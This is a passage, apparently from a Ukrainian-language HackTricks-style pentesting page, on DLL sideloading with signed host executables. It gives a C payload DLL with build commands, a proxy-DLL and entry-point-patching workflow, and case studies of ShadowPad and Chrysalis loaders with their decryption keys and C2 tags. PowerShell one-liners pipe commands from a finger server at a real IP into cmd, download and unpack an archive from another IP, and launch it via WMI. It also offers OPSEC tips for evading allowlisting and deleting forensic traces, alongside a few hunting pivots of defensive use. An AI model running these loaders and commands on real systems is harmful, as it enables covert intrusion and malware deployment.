' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Помістіть ці два файли в одну папку:
- wsc_proxy.exe: легітимний підписаний host (Avast). Процес намагається завантажити wsc.dll за іменем зі своєї директорії.
- wsc.dll: DLL атакувальника. Якщо не потрібні конкретні exports, достатньо DllMain; інакше, створіть proxy DLL і перенаправляйте потрібні exports до справжньої бібліотеки, запускаючи payload у DllMain.
- Зберіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для export requirements використовуйте proxying framework (наприклад, DLLirant/Spartacus), щоб згенерувати forwarding DLL, яка також виконує ваш payload.

- Ця technique покладається на DLL name resolution з боку host binary. Якщо host використовує absolute paths або safe loading flags (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на precedence і їх потрібно враховувати під час вибору host binary та export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point описали, як Ink Dragon розгортає ShadowPad, використовуючи **three-file triad**, щоб зливатися з legitimate software, водночас тримаючи core payload encrypted на disk:

1. **Signed host EXE** – зловживають vendor-ами на кшталт AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers перейменовують executable так, щоб він виглядав як Windows binary (наприклад, `conhost.exe`), але Authenticode signature залишається valid.
2. **Malicious loader DLL** – dropped поруч із EXE з очікуваною назвою (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC binary, obfuscated за допомогою ScatterBrain framework; її єдина задача — знайти encrypted blob, decrypt it і reflectively map ShadowPad.
3. **Encrypted payload blob** – часто зберігається як `<name>.tmp` у тій самій директорії. Після memory-mapping decrypted payload loader видаляє TMP файл, щоб знищити forensic evidence.

Tradecraft notes:

* Перейменування signed EXE (із збереженням оригінального `OriginalFileName` у PE header) дозволяє йому маскуватися під Windows binary, але зберігати vendor signature, тож відтворюйте звичку Ink Dragon скидати binaries, що виглядають як `conhost.exe`, але насправді є AMD/NVIDIA utilities.
* Оскільки executable лишається trusted, більшість allowlisting controls мають лише дозволити ваш malicious DLL поруч із ним. Зосередьтеся на customization loader DLL; signed parent зазвичай може запускатися без змін.
* Decryptor ShadowPad очікує, що TMP blob лежить поруч із loader і буде writable, щоб можна було zero file після mapping. Тримайте директорію writable, доки payload не завантажиться; коли він уже в memory, TMP файл можна безпечно видалити для OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators поєднують DLL sideloading з LOLBAS, щоб єдиним custom artifact на disk був malicious DLL поруч із trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell запускає `cmd.exe /c`, отримує commands із Finger server і передає їх у `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` отримує TCP/79 text; `| cmd` виконує відповідь сервера, дозволяючи operators змінювати second stage server-side.

- **Built-in download/extract:** Завантажте archive з benign extension, unpack it і розташуйте sideload target plus DLL у random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` приховує progress і follows redirects; `tar -xf` використовує built-in tar у Windows.

- **WMI/CIM launch:** Запустіть EXE через WMI, щоб telemetry показувала процес, створений через CIM, поки він завантажує colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Працює з binaries, які віддають перевагу local DLLs (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) виконується під trusted name.

- **Hunting:** Сигналізуйте на `forfiles`, коли `/p`, `/m` і `/c` з’являються разом; це нетипово поза admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Недавнє вторгнення Lotus Blossom зловжило trusted update chain, щоб доставити NSIS-packed dropper, який staged DLL sideload плюс fully in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає його як **HIDDEN**, скидає перейменований Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` і encrypted blob `BluetoothService`, а потім запускає EXE.
- Host EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` mmap-loads blob; `LogWrite` decrypts його за допомогою custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material derived from a prior hash), overwrites buffer plaintext shellcode, frees temps і стрибає в нього.
- Щоб уникнути IAT, loader резолвить APIs, хешуючи export names за допомогою **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, а потім застосовує Murmur-style avalanche (**0x85EBCA6B**) і порівнює з salted target hashes.

Main shellcode (Chrysalis)
- Decrypts PE-like main module, повторюючи add/XOR/sub з key `gQ2JR&9;` протягом five passes, потім dynamically loads `Kernel32.dll` → `GetProcAddress`, щоб завершити import resolution.
- Reconstructs DLL name strings runtime через per-character bit-rotate/XOR transforms, потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який обходить **PEB → InMemoryOrderModuleList**, парсить кожну export table у 4-byte blocks з Murmur-style mixing і лише потім повертається до `GetProcAddress`, якщо hash не знайдено.

Embedded configuration & C2
- Config знаходиться всередині dropped `BluetoothService` file на **offset 0x30808** (size **0x980**) і RC4-decrypted з key `qwhvb^435h&*7`, відкриваючи C2 URL і User-Agent.
- Beacons формують host profile, розділений крапками, додають tag `4Q`, потім RC4-encrypt з key `vAuig34%^325hGV` перед `HttpSendRequestA` over HTTPS. Responses RC4-decrypted і розподіляються через tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode керується CLI args: no args = install persistence (service/Run key), що вказує на `-i`; `-i` relaunches self with `-k`; `-k` skips install і запускає payload.

Alternate loader observed
- Та сама intrusion скинула Tiny C Compiler і запустила `svchost.exe -nostdlib -run conf.c` з `C:\ProgramData\USOShared\`, а `libtcc.dll` лежав поруч. C source, наданий attacker-ом, вбудовував shellcode, компілював його і запускав in-memory, не торкаючись disk з PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Цей етап compile-and-run на основі TCC імпортував `Wininet.dll` під час виконання і завантажував shellcode другої стадії з hardcoded URL, надаючи гнучкий loader, що маскувався під запуск компілятора.

## Signed-host sideloading with export proxying + host thread parking

Деякі ланцюжки DLL sideloading додають **stability engineering**, щоб легітимний host залишався активним достатньо довго для коректного завантаження пізніших стадій замість падіння після завантаження malicious DLL.

Спостережуваний патерн
- Підкиньте довірений EXE поруч із malicious DLL, використовуючи очікуване ім'я залежності, наприклад `version.dll`.
- Malicious DLL **проксіює кожен очікуваний export** назад до реальної системної DLL (наприклад `%SystemRoot%\\System32\\version.dll`), щоб import resolution і надалі успішно працював, а host process продовжував функціонувати.
- Після завантаження malicious DLL **патчить host entry point**, щоб main thread переходив в нескінченний цикл `Sleep` замість завершення або виконання code paths, які б завершили процес.
- Новий thread виконує реальну malicious роботу: розшифровує ім'я або path DLL наступної стадії (RC4/XOR — поширені), а потім запускає її через `LoadLibrary`.

Чому це важливо
- Звичайний DLL proxying зберігає API compatibility, але не гарантує, що host залишиться активним достатньо довго для пізніших стадій.
- Переведення main thread у `Sleep(INFINITE)` — простий спосіб утримати signed process у пам'яті, поки loader виконує розшифрування, staging або network bootstrap у worker thread.
- Пошук лише підозрілого `DllMain` може пропустити цей патерн, якщо цікава поведінка відбувається після того, як host entry point уже пропатчено і запущено secondary thread.

Мінімальний workflow
1. Скопіюйте signed host EXE і визначте DLL, яку він резолвить з local directory.
2. Зберіть proxy DLL, що експортує ті самі функції та forward'ить їх до легітимної DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створіть worker thread.
4. Із цього thread пропатчте host entry point або routine запуску main thread так, щоб він зациклювався на `Sleep`.
5. Розшифруйте ім'я/config DLL наступної стадії та викличте `LoadLibrary` або manual-map payload.

Defensive pivots
- Signed processes, що завантажують `version.dll` або подібні поширені libraries зі своєї application directory замість `System32`.
- Патчі пам'яті в process entry point невдовзі після image load, особливо jumps/calls, перенаправлені на `Sleep`/`SleepEx`.
- Threads, створені proxy DLL, які одразу викликають `LoadLibrary` для другої DLL із розшифрованою назвою.
- Full-export proxy DLL, розміщені поруч із vendor executables у writable staging directories, таких як `ProgramData`, `%TEMP%`, або шляхах розпакованих архівів.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
